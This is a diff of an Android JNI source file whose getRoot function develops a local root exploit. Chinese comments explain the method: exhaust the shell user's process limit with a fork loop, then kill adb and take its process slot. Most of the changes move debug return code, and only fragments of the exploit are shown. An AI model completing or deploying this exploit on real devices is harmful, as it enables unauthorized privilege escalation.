@@ -104,13 +104,9 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
 /*
  * 测试find_adb(),成功返回进程号
  */
-/*
-    std::string ss = "didn't root successfully!";
-    char tmp[256];
-    sprintf(tmp,"%d",adb_pid);
-    ss = tmp;
-    return env->NewStringUTF(ss.c_str());
-*/
+
+
+
     //测试点2
     //成功
 
@@ -164,6 +160,7 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
                 // 在子进程中，exploit代码不断地fork(),而新的进程不断退出，
                 // 从而产生大量的僵尸进程（占据shell用户的进程数）
                 // 最终，进程数达到上限，fork()返回小于0
+                _exit(0);
                 exit(0);
             }
             else if (p < 0) {
@@ -184,9 +181,15 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
     //注释掉exit(0)后
     //成功
 
+    std::string ss = "didn't root successfully!";
+    char tmp[256];
+    sprintf(tmp,"%d",p);
+    ss = tmp;
+    return env->NewStringUTF(ss.c_str());
 
 
 //进一步的，exploit杀掉adb进程，并在系统检测到这一现象并重启一个adb之前，再一次fork()，将前一个adb留下的进程空位占据
+
 //    close(pepe[1]);
 //    read(pepe[0], &c, 1);
 
@@ -222,11 +225,13 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
      */
 
 //    result = setsid();
+/*
     std::string ss = "didn't root successfully!";
     char tmp[256];
     sprintf(tmp,"%d",result);
     ss = tmp;
     return env->NewStringUTF(ss.c_str());
+*/
 }
 
 
